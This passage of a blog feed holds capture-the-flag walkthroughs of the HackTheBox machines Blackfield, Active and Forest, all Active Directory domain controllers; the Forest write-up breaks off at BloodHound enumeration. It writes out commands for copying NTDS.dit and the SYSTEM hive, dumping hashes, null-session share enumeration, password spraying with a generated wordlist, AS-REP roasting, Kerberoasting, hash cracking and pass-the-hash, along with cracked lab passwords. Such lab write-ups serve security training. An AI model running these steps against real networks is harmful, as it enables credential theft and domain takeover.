<p><em>to be able to get a copy of</em> <code class="language-plaintext highlighter-rouge">NTDS.dit</code> <em>from</em> <code class="language-plaintext highlighter-rouge">z:\</code>, we would need to use the <code class="language-plaintext highlighter-rouge">Robocopy</code> command-line utility with <code class="language-plaintext highlighter-rouge">/b</code> flag for <code class="language-plaintext highlighter-rouge">backup mode</code>. This would basically allow the copying to bypass the <code class="language-plaintext highlighter-rouge">ACLs</code> of the file if the <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> was held.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robocopy /?

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : 18 April 2022 20:10:47
              Usage :: ROBOCOPY source destination [file [file]...] [options]
             source :: Source Directory (drive:\path or \\server\share\path).
        destination :: Destination Dir  (drive:\path or \\server\share\path).
               file :: File(s) to copy  (names/wildcards: default is "*.*").

::
:: Copy options :
::

                 /S :: copy Subdirectories, but not empty ones.
                 /E :: copy subdirectories, including Empty ones.
             /LEV:n :: only copy the top n LEVels of the source directory tree.
                 /Z :: copy files in restartable mode.
                 /B :: copy files in Backup mode.  &lt;-------------
                /ZB :: use restartable mode; if access denied use Backup mode.
                 /J :: copy using unbuffered I/O (recommended for large files).
            /EFSRAW :: copy all encrypted files in EFS RAW mode.
</code></pre></div></div>

<p><em>using the command:</em> <code class="language-plaintext highlighter-rouge">robocopy /b z:\windows\ntds . ntds.dit</code>, the copy is a success! :D</p>

<p><img src="/assets/Blackfield/got-ntds-dit.jpg" alt="got-ntds-dit" /></p>

<p>we can then use the <code class="language-plaintext highlighter-rouge">reg</code> command with the <code class="language-plaintext highlighter-rouge">save</code> option to get the <code class="language-plaintext highlighter-rouge">SYSTEM</code> hive:</p>

<p><code class="language-plaintext highlighter-rouge">reg save hklm\system c:\windows\Temp\system</code></p>

<p><img src="/assets/Blackfield/got-system-hive.jpg" alt="got-system-hive" /></p>

<h3 id="hashes-everywhere">Hashes everywhere</h3>

<p>we can use <code class="language-plaintext highlighter-rouge">evil-winrm</code> <code class="language-plaintext highlighter-rouge">download</code> functionality to retrieve the files to our kali machine. where can use <code class="language-plaintext highlighter-rouge">impacket</code>’s <code class="language-plaintext highlighter-rouge">secretsdump.py</code> script to dump all the contents.</p>

<p><em>And down all the hashes go…</em></p>

<p><img src="/assets/Blackfield/secrets-dump.jpg" alt="secrets-dump" /></p>

<p><em>having the domain administrator’s hash,</em> we can easily remote in using <strong>PowerShell Remoting</strong> and we’re admin on the box :D</p>

<p><img src="/assets/Blackfield/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A Domain Controller machine. We first find SMB anonymous read access to a share containing a list of folders which can be used as usernames. We perform an ASREPRoast attack using the created wordlist to get credentials for the support user. Using BloodHound to enumerate the domain, we find that this user can reset the password for another account audit2020 After resetting audit2020‘s password, we gain access to the forensic SMB share which has a memory dump of lsass.exe Using Mimikatz to extract hashes from the dump, we gain access to the svc_backup user. svc_backup is a member of the Backup Operators group which have the privilege of backing up most files on the domain controller. We abuse this privilege to back up the NTDS.dit file and the system registry hive which we use to dump all the NTLM hashes of the domain. With the Domain Administrators NTLM hash, we can Pass-the-Hash to gain full access.]]></summary></entry><entry><title type="html">Active</title><link href="https://omnisl4sh.github.io/2022/04/14/Active.html" rel="alternate" type="text/html" title="Active" /><published>2022-04-14T00:00:00+02:00</published><updated>2022-04-14T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/14/Active</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/14/Active.html"><![CDATA[<h3 id="summary">Summary</h3>
<ul>
  <li>A Domain Controller Machine. We first find an SMB share called <code class="language-plaintext highlighter-rouge">Replication</code> which we can <code class="language-plaintext highlighter-rouge">read</code> using <code class="language-plaintext highlighter-rouge">null authentication</code>.</li>
  <li><em>Going through the share,</em> we find a <code class="language-plaintext highlighter-rouge">Groups.xml</code> file containing the encrypted password of the <code class="language-plaintext highlighter-rouge">svc_tgs</code> account.</li>
  <li>This password can be <em>easily</em> decrypted using the <code class="language-plaintext highlighter-rouge">gpp-decrypt</code> built-in tool and we can authenticate as <code class="language-plaintext highlighter-rouge">svc_tgs</code>.</li>
  <li>We find that we can <strong>kerberoast</strong> the <strong>Domain Administrator</strong> and we get his <strong>TGS</strong> hash.</li>
  <li>The hash is crackable with <code class="language-plaintext highlighter-rouge">John</code> and we retrieve the password to gain full access.</li>
</ul>

<hr />

<h3 id="nmap">Nmap</h3>
<p>we start off by doing a complete <code class="language-plaintext highlighter-rouge">nmap</code> with default scripts <code class="language-plaintext highlighter-rouge">-sC</code> and service detection <code class="language-plaintext highlighter-rouge">-sV</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION          
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:                 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-14 20:57:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC                                                               
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?                  
464/tcp   open  kpasswd5?      
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped                      
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped                                                                                        
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found                         
|_http-server-header: Microsoft-HTTPAPI/2.0    
49152/tcp open  msrpc         Microsoft Windows RPC                                                               
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0     
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
                                                         
Host script results:                           
| smb2-security-mode:                             
|   2.1:      
|_    Message signing enabled and required
| smb2-time:              
|   date: 2022-04-14T20:58:13                   
|_  start_date: 2022-04-14T20:53:18  
</code></pre></div></div>
<h3 id="domain-controller-identification">Domain Controller Identification</h3>
<p>and we notice a set of open ports than indicate a domain controller:</p>
<ul>
  <li><strong>DNS:</strong> TCP 53</li>
  <li><strong>Kerberos:</strong> TCP 88</li>
  <li><strong>LDAP:</strong> TCP 389</li>
  <li><strong>Global Catalog LDAP:</strong> TCP 3268</li>
</ul>

<p>we can also verify that by doing a DNS query for a domain’s SRV record using <code class="language-plaintext highlighter-rouge">nslookup -type=srv _ldap._tcp.dc._msdcs.active.htb</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Server:         10.10.10.100
Address:        10.10.10.100#53

printsection()
_ldap._tcp.dc._msdcs.active.htb service = 0 100 389 dc.active.htb.
still pending.
dighost.c:4079:query_detach(0x7f113122d000) = 1
dighost.c:4081:_cancel_lookup()
dighost.c:2669:query_detach(0x7f113122d000) = 0
dighost.c:2669:destroy_query(0x7f113122d000) = 0
dighost.c:1634:lookup_detach(0x7f113259e000) = 3
dighost.c:2669:query_detach(0x7f113122d1c0) = 0
dighost.c:2669:destroy_query(0x7f113122d1c0) = 0
dighost.c:1634:lookup_detach(0x7f113259e000) = 2
check_if_done()
list empty
dighost.c:4087:lookup_detach(0x7f113259e000) = 1
clear_current_lookup()
dighost.c:1759:lookup_detach(0x7f113259e000) = 0
destroy_lookup
freeing server 0x7f1131212000 belonging to 0x7f113259e000
freeing server 0x7f1131212a00 belonging to 0x7f113259e000
start_lookup()
check_if_done()
list empty
shutting down
dighost_shutdown()
unlock_lookup dighost.c:4091
</code></pre></div></div>

<h3 id="smb-share-enumeration">SMB Share enumeration</h3>
<p>first, we check <strong>SMB shares</strong> using <strong>null authenticaion</strong> with <code class="language-plaintext highlighter-rouge">crackmapexec</code>. And, we find that we have <strong>READ access</strong> to the <code class="language-plaintext highlighter-rouge">Replication</code> share.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─# crackmapexec smb 10.10.10.100 -u '' -p '' --shares
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [-] active.htb\: STATUS_ACCESS_DENIED 
SMB         10.10.10.100    445    DC               [+] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share 
SMB         10.10.10.100    445    DC               Users 
</code></pre></div></div>
<p>This is interesting. We go ahead and connect to the share using <code class="language-plaintext highlighter-rouge">smbclient</code>. <em>But before that,</em> we create a folder and call it <code class="language-plaintext highlighter-rouge">smb-replication</code> and change to it so we can download files inside it. We can download all files within using <code class="language-plaintext highlighter-rouge">mask ""</code> -&gt; <code class="language-plaintext highlighter-rouge">recurse</code> -&gt; <code class="language-plaintext highlighter-rouge">prompt</code> -&gt; <code class="language-plaintext highlighter-rouge">mget *</code>. This essentially tells <code class="language-plaintext highlighter-rouge">smbclient</code> to download all files <em>recursively</em> and <em>without prompting</em> us each time.</p>

<p><img src="/assets/Active/smb-replication-share.jpg" alt="smb-replication-share" /></p>

<p>doing so gets us all the files over the <code class="language-plaintext highlighter-rouge">Replication</code> share. we can now view them locally with <code class="language-plaintext highlighter-rouge">find . -type f</code></p>

<p><img src="/assets/Active/repl-share-files.jpg" alt="repl-share-files" /></p>

<h3 id="group-policy-preferences">Group Policy Preferences</h3>

<p>The first file <code class="language-plaintext highlighter-rouge">Groups.xml</code> is a <strong>Group Policy Preferences</strong> file. This was used back in the day by system admins to create local administrator accounts on domain machines using <strong>Group Policy</strong>. <em>Looking at its contents:</em></p>

<p><img src="/assets/Active/groups-xml.jpg" alt="groups-xml" /></p>

<p>It reveals an encrypted password of the user <code class="language-plaintext highlighter-rouge">active.htb\svc_tgs</code>. This can easily be cracked using the <code class="language-plaintext highlighter-rouge">gpp-decrypt</code> tool that’s installed into Kali by default. Doing so reveals the password to be <code class="language-plaintext highlighter-rouge">GPPstillStandingStrong2k18</code></p>

<p><img src="/assets/Active/gpp-decrypted.jpg" alt="gpp-decrypted" /></p>

<p><em>Having credentials,</em> we test them out with <code class="language-plaintext highlighter-rouge">crackmapexec</code> to verify they are valid:</p>

<p><img src="/assets/Active/svc-tgs-creds-valid.jpg" alt="svc-tgs-creds-valid" /></p>

<p>Great! They are valid. But, we aren’t local administrator. Neither can we use <strong>WinRM</strong> because port 5985 isn’t open on this box and we don’t know if we have this privilege or not. We can however do a number of things.</p>

<h3 id="options-with-a-valid-ad-user">Options with a valid AD user</h3>
<ol>
  <li>enumerate SMB shares with the new user</li>
  <li>pull all AD users</li>
  <li>do ASREPRoasting</li>
  <li>do Kerberoasting</li>
  <li>do BloodHound Enumeration</li>
  <li>do Password Spraying</li>
</ol>

<p><em>we start with enumerating SMB shares as the new user:</em></p>

<p><img src="/assets/Active/smb-with-svc-tgs.jpg" alt="smb-with-svc-tgs" /></p>

<p>but only find the <code class="language-plaintext highlighter-rouge">user.txt</code> flag to be significant.</p>

<p>we pull all AD users using <strong>impacket</strong>’s <code class="language-plaintext highlighter-rouge">GetADUsers.py</code>:</p>

<p><img src="/assets/Active/get-adusers-output.jpg" alt="get-adusers-output" /></p>

<p>we don’t find any other special users. The default Administrator, Guest &amp; krbtgt accounts are nothing new.</p>

<p><em>Moving on to</em> <strong>ASREPRoasting</strong> <em>with</em> <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code></p>

<p><img src="/assets/Active/asrep-roasting.jpg" alt="asrep-roasting" /></p>

<p>we get <code class="language-plaintext highlighter-rouge">No entries found</code></p>

<p><em>And along to</em> <strong>Kerberoasting</strong> <em>with</em> <code class="language-plaintext highlighter-rouge">GetUserSPNs.py</code></p>

<p><img src="/assets/Active/kerberoasting.jpg" alt="kerberoasting" /></p>

<h3 id="kerberoasted-d">Kerberoasted :D</h3>

<p>We get really <strong>LUCKY!</strong> this is the <strong>TGS</strong> hash for the <strong>Administrator</strong> account. Cracking that hash means we can get his password!</p>

<p>This can be done using <code class="language-plaintext highlighter-rouge">john</code> with the format as <strong>krb5tgs</strong></p>

<p><img src="/assets/Active/cracked.jpg" alt="cracked" /></p>

<p>We got the administrator password: <code class="language-plaintext highlighter-rouge">Ticketmaster1968</code></p>

<p>We verify we have code execution with <strong>impacket</strong>’s <code class="language-plaintext highlighter-rouge">psexec.py</code></p>

<p><img src="/assets/Active/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A Domain Controller Machine. We first find an SMB share called Replication which we can read using null authentication. Going through the share, we find a Groups.xml file containing the encrypted password of the svc_tgs account. This password can be easily decrypted using the gpp-decrypt built-in tool and we can authenticate as svc_tgs. We find that we can kerberoast the Domain Administrator and we get his TGS hash. The hash is crackable with John and we retrieve the password to gain full access.]]></summary></entry><entry><title type="html">Forest</title><link href="https://omnisl4sh.github.io/2022/04/08/Forest.html" rel="alternate" type="text/html" title="Forest" /><published>2022-04-08T00:00:00+02:00</published><updated>2022-04-08T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/08/Forest</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/08/Forest.html"><![CDATA[<h3 id="summary">Summary</h3>
<ul>
  <li>A Domain Controller machine. <strong>Anonymous LDAP</strong> is enabled which we use to get <strong>a full list of AD users</strong>.</li>
  <li><em>After performing an</em> <strong>ASREPRoast attack</strong>, we end up with a user that has <strong>PowerShell Remoting Access</strong>.</li>
  <li><em>Using</em> <strong>BloodHound</strong> <em>for</em> <strong>Domain Enumeration</strong>, we find that the user is member of the <strong>Account Operators</strong> group which <em>gives him the privilege of adding users to AD groups other than Domain Admins etc.</em></li>
  <li>We add our user to a group called <strong>‘Exchange Windows Permissions’</strong> which has a <strong>write DACL</strong> over the domain.</li>
  <li><em>Abusing this privilege</em> lets us give ourselves the <strong>DCSync right</strong> over the domain using <strong>PowerView</strong> which <em>lets us grab all its NTLM hashes</em></li>
  <li>We use the Domain <em>Administrator’s hash</em> in a simple <strong>Pass-the-Hash</strong> attack to gain full access.</li>
</ul>

<hr />

<h3 id="nmap">Nmap</h3>
<p>We start off doing a <em>comprehensive</em> nmap scan with <strong>default scripts</strong> and <strong>service detection</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-05 19:09:07Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
49967/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-04-05T19:10:01
|_  start_date: 2022-04-05T18:45:37
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2022-04-05T12:10:02-07:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h26m50s, deviation: 4h02m31s, median: 6m49s
</code></pre></div></div>

<h3 id="domain-controller-detected">Domain Controller Detected</h3>

<p>We find a collection of ports that give us a high probability that this is windows machine and a domain controller:</p>
<ul>
  <li>DNS on port 53</li>
  <li>Kerberos on port 88</li>
  <li>SMB on port 445</li>
  <li>LDAP on port 636</li>
  <li>Global Catalog on port 3268</li>
  <li>WinRM on port 5985</li>
</ul>

<p>From the nmap script <code class="language-plaintext highlighter-rouge">smb-os-discovery</code>, the domain name should be <code class="language-plaintext highlighter-rouge">htb.local</code></p>

<h3 id="fetching-a-list-of-all-ad-users">Fetching a list of all AD users</h3>

<p>We want to start enumerating users. So we use an impacket tool called <code class="language-plaintext highlighter-rouge">GetADUsers.py</code>.</p>

<p>The command is: <code class="language-plaintext highlighter-rouge">GetADUsers.py -dc-ip 10.10.10.161 "htb.local/" -all</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Querying 10.10.10.161 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator         Administrator@htb.local         2021-08-30 20:51:58.690463  2022-04-05 14:46:24.124409 
Guest                                                 &lt;never&gt;              &lt;never&gt;             
DefaultAccount                                        &lt;never&gt;              &lt;never&gt;             
krbtgt                                                2019-09-18 06:53:23.467452  &lt;never&gt;             
$331000-VK4ADACQNUCA                                  &lt;never&gt;              &lt;never&gt;             
SM_2c8eef0a09b545acb  SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local  &lt;never&gt;              &lt;never&gt;             
SM_ca8c2ed5bdab4dc9b  SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local  &lt;never&gt;              &lt;never&gt;             
SM_75a538d3025e4db9a  SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local  &lt;never&gt;              &lt;never&gt;             
SM_681f53d4942840e18  DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local  &lt;never&gt;              &lt;never&gt;             
SM_1b41c9286325456bb  Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local  &lt;never&gt;              &lt;never&gt;             
SM_9b69f1b9d2cc45549  FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local  &lt;never&gt;              &lt;never&gt;             
SM_7c96b981967141ebb  SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local  &lt;never&gt;              &lt;never&gt;             
SM_c75ee099d0a64c91b  SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.local  &lt;never&gt;              &lt;never&gt;             
SM_1ffab36a2f5f479cb  SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.local  &lt;never&gt;              &lt;never&gt;             
HealthMailboxc3d7722  HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local  2019-09-23 18:51:31.892097  2019-09-23 18:57:12.361516 
HealthMailboxfc9daad  HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local  2019-09-23 18:51:35.267114  2019-09-23 18:52:05.736012 
HealthMailboxc0a90c9  HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local  2019-09-19 07:56:35.206329  &lt;never&gt;             
HealthMailbox670628e  HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local  2019-09-19 07:56:45.643993  &lt;never&gt;             
HealthMailbox968e74d  HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local  2019-09-19 07:56:56.143969  &lt;never&gt;             
HealthMailbox6ded678  HealthMailbox6ded67848a234577a1756e072081d01f@htb.local  2019-09-19 07:57:06.597012  &lt;never&gt;             
HealthMailbox83d6781  HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local  2019-09-19 07:57:17.065809  &lt;never&gt;             
HealthMailboxfd87238  HealthMailboxfd87238e536e49e08738480d300e3772@htb.local  2019-09-19 07:57:27.487679  &lt;never&gt;             
HealthMailboxb01ac64  HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local  2019-09-19 07:57:37.878559  &lt;never&gt;             
HealthMailbox7108a4e  HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local  2019-09-19 07:57:48.253341  &lt;never&gt;             
HealthMailbox0659cc1  HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local  2019-09-19 07:57:58.643994  &lt;never&gt;             
sebastien                                             2019-09-19 20:29:59.544725  2019-09-22 18:29:29.586227 
lucinda                                               2019-09-19 20:44:13.233891  &lt;never&gt;             
svc-alfresco                                          2022-04-05 15:18:27.420771  2019-09-23 07:09:47.931194 
andy                                                  2019-09-22 18:44:16.291082  &lt;never&gt;             
mark                                                  2019-09-20 18:57:30.243568  &lt;never&gt;             
santi                                                 2019-09-20 19:02:55.134828  &lt;never&gt; 
</code></pre></div></div>

<p><em>Because LDAP Anonymous access is enabled,</em> this gets us <strong>all</strong> the users in the domain. The ones below look organic enough for us to try spraying.</p>
<ul>
  <li>Administrator</li>
  <li>sebastien</li>
  <li>lucinda</li>
  <li>svc-alfresco</li>
  <li>andy</li>
  <li>mark</li>
  <li>santi</li>
</ul>

<h3 id="wordlist-generation-from-common-username-schemes">Wordlist generation from common username schemes</h3>

<p><em>Since we need a wordlist,</em> We create a basic one from the most common passwords (like “P@ssw0rd” etc.) and from <strong>commonly used password convention schemes</strong> like:</p>
<ul>
  <li>Season + Year</li>
  <li>Season + Year + !</li>
  <li>Season + Special Char + Year</li>
  <li>Company Name + Year</li>
  <li>Company Name + Year + !</li>
  <li>Company Name + Special Char + Year</li>
</ul>

<p>We will pretend that <code class="language-plaintext highlighter-rouge">Forest</code> is the company name even though it’s a CTF. Because that’s what I would do in a real pentest :D
Also, the year this machine has been launched is 2019. So we will use that year as well as a couple of years around it (2017, 2018, 2020 and 2021).</p>

<p>I write a quick <code class="language-plaintext highlighter-rouge">PowerShell</code> script for this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$CompanyName = "Forest"
$Seasons = 'Summer', 'Winter', 'Spring', 'Fall'
$Years = 2017..2021
$Special_Chars = '!@#$%^&amp;*'.ToCharArray()
$Wordlist = @()

Foreach($Year in $Years){
	$Wordlist += "$CompanyName$Year"
	$Wordlist += "$CompanyName$Year!"
	Foreach($Season in $Seasons){
		$Wordlist += "$Season$Year"
		$Wordlist += "$Season$Year!"
		Foreach($Char in $Special_Chars){
			$Wordlist += "$Season$Char$Year"
			$Wordlist += "$CompanyName$Char$Year"
		}
	}
}
</code></pre></div></div>

<p><em>Running that script,</em> I get a list of 370 passwords to try. Not bad :D</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>..SNIP..
Forest2019
Forest2019!
Summer2019
Summer2019!
Summer!2019
Forest!2019
Summer@2019
Forest@2019
Summer#2019
Forest#2019
Summer$2019
Forest$2019
Summer%2019
..SNIP..
</code></pre></div></div>

<h3 id="enumerating-domain-password-policy-before-password-spraying">Enumerating domain password policy before password spraying</h3>

<p>I then use <code class="language-plaintext highlighter-rouge">crackmapexec</code> to obtain the password policy. We don’t want to lock everyone one out XD</p>

<p><img src="/assets/Forest/CME-Pass-Pol.jpg" alt="CME-Pass-Pol" /></p>

<p>We see that <code class="language-plaintext highlighter-rouge">Account Lockout Threshold: None</code> and <code class="language-plaintext highlighter-rouge">Domain Password Lockout Admins: 0</code>. This is amazing! we can definitely bruteforce without any problems :D</p>

<p>We start the spray using:
<code class="language-plaintext highlighter-rouge">crackmapexec smb 10.10.10.161 -u users.txt -p passwords.txt --continue-on-success</code></p>

<p>But we get no luck with that :/</p>

<h3 id="asreproasting">ASREPRoasting</h3>

<p><em>Having no credentials,</em> we can still try an attack called <code class="language-plaintext highlighter-rouge">ASREP Roasting</code>. This attack would let us grab the hashes of accounts that <strong>don’t require Kerberos PreAuthentication.</strong></p>

<p>we run this attack using impacket’s <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code> script:</p>

<p><code class="language-plaintext highlighter-rouge">GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile asrep-hashes.txt</code></p>

<p>This is after we set <code class="language-plaintext highlighter-rouge">10.10.10.161</code> as our name server in <code class="language-plaintext highlighter-rouge">/etc/resolv.conf</code>. We do this because impacket does DNS lookups in the background.</p>

<p><img src="/assets/Forest/etc-resolv.jpg" alt="etc-resolv" /></p>

<p><img src="/assets/Forest/asrep-roast.jpg" alt="asrep-roast" /></p>

<p>notice that the user <code class="language-plaintext highlighter-rouge">svc-alfresco</code> doesn’t show in the script console output. I’m not sure why xD but the hash was pushed out to the <code class="language-plaintext highlighter-rouge">asrep-hashes.txt</code> file.</p>

<h3 id="cracking-tgt-with-john">Cracking TGT with <code class="language-plaintext highlighter-rouge">John</code></h3>

<p>we use <code class="language-plaintext highlighter-rouge">john</code> to crack the hash and the password for <code class="language-plaintext highlighter-rouge">svc-alfresco</code> turns out to be <code class="language-plaintext highlighter-rouge">s3rvice</code></p>

<p><img src="/assets/Forest/cracked.jpg" alt="cracked" /></p>

<p><em>in case you were wondering,</em> the wordlist I used <code class="language-plaintext highlighter-rouge">gegalist.txt</code> is just one big list of all the passwords on <code class="language-plaintext highlighter-rouge">Seclists</code> (https://github.com/danielmiessler/SecLists/tree/master/Passwords) concatenated and cleaned up. I use it for all hash cracking. It’s only 21,377,691 passwords. Just kidding, it’s a pretty fat list XD</p>

<p>Alright, here is our first set of creds:</p>
<ul>
  <li>Username: htb.local\svc-alfresco</li>
  <li>Password: s3rvice</li>
</ul>

<h3 id="remote-code-execution">Remote Code Execution</h3>

<p>We first try to login using <code class="language-plaintext highlighter-rouge">crackmapexec</code> using the <code class="language-plaintext highlighter-rouge">SMB</code> module. But that doesn’t work. This is because <code class="language-plaintext highlighter-rouge">svc-alfresco</code> isn’t a local administrator on the machine. So we try another approach for remote code execution. This time using a tool called <code class="language-plaintext highlighter-rouge">evil-winrm</code> (https://github.com/Hackplayers/evil-winrm)</p>

<p><img src="/assets/Forest/evil-winrm.jpg" alt="evil-winrm" /></p>

<p>it works like a charm, this is because we’re a member of the builtin group of <code class="language-plaintext highlighter-rouge">Remote Management Users</code></p>

<p><img src="/assets/Forest/groups.jpg" alt="groups" /></p>

<h3 id="privilege-escalation">Privilege Escalation</h3>

<p><em>Right after,</em> we get down to enumeration for privesc</p>

<ol>
  <li>we look for interesting files in user profiles –&gt; nothing</li>
  <li>we check for interesting directories in <code class="language-plaintext highlighter-rouge">c:\</code> –&gt; nothing</li>
  <li>we check processes –&gt; nothing interesting there</li>
  <li>we check services –&gt; access denied</li>
  <li>we run systeminfo to get information on the kernel –&gt; access denied</li>
  <li>we check for saved creds with <code class="language-plaintext highlighter-rouge">cmdkey /list</code> –&gt; nothing</li>
  <li>we check our privileges with <code class="language-plaintext highlighter-rouge">whoami /privs</code> –&gt; nothing special there</li>
  <li>we run WinPEAS (https://github.com/carlospolop/PEASS-ng) and still don’t find anything</li>
</ol>

<p>but …</p>

<p><em>going back to our group memberships,</em> we do find ourselves in quite a few interesting groups:</p>
<ol>
  <li>Account Operators –&gt; this can let us create AD accounts and add them to groups other than high privilege ones (Administrators, Domain Admins etc.) (https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators)</li>
  <li>Privileged IT Accounts –&gt; this is not a standard AD group and we would want to know what those <em>Privileges</em> are :D</li>
  <li>Service Accounts –&gt; this too might be interesting</li>
</ol>

<h3 id="domain-enumeration-with-bloodhound">Domain Enumeration with BloodHound</h3>

<p><em>since we’re in a an Active Directory environment,</em> a standard tool to use is <code class="language-plaintext highlighter-rouge">BloodHound</code> (https://github.com/BloodHoundAD/BloodHound). It can help us identify paths to escalate our privileges inside a domain context. We will use it show us what can be done using the privileges that we hold.</p>

